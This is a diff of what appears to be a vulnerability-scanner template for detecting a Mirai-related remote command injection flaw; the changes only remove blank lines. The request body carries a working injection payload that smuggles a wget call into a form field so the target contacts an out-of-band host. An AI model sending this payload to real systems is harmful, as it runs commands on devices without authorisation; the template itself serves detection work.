@@ -1,5 +1,4 @@
 id: mirai-unknown-rce
-
 info:
   name: Mirai - Remote Command Injection
   author: gy741
@@ -13,7 +12,6 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: mirai,rce,oast
-
 requests:
   - raw:
       - |
@@ -22,7 +20,6 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         key=';`wget http://{{interactsh-url}}`;#
-
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the HTTP Interaction
